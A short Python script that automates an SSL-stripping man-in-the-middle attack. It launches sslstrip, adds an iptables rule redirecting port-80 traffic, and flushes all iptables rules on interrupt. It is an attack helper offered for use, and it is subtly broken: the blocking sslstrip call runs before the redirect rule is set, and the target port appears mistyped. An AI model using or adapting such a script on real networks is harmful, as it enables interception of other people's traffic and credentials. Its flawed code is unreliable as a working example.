#!/usr/bin/env python

import subprocess 

# just automates a call to sslstrip and sets the iptable rules required and exits by flushing iptables

try:
    subprocess.call("sslstrip",shell=True)
    subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000", shell=True)
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)

